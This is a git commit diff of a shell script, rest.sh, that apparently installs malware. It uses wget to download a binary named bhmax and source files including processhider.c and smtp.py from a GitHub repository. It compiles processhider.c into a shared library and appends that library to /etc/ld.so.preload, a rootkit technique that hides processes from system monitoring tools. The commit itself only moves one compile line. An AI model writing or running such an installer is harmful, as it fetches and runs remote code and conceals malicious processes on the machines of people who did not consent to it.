ebd23b2623eb3ad21dec14c2c87e1d8f5e89cf2d
hudahadoh <168321021+hudahadoh@users.noreply.github.com>
2024-05-22 01:00:26 -0400

    Update rest.sh

--- rest.sh
+++ rest.sh
@@ -3,9 +3,9 @@ wget https://github.com/hudahadoh/hime/raw/main/bhmax
 wget https://raw.githubusercontent.com/hudahadoh/hime/main/hi.c
 wget https://raw.githubusercontent.com/hudahadoh/hime/main/processhider.c
 wget https://raw.githubusercontent.com/hudahadoh/hime/main/smtp.py
-gcc -o hi hi.c
 gcc -Wall -fPIC -shared -o libprocess.so processhider.c -ldl
 mv libprocess.so /usr/local/lib/
 echo /usr/local/lib/libprocess.so >> /etc/ld.so.preload
 chmod +x hi
 chmod +x bhmax
+gcc -o hi hi.c
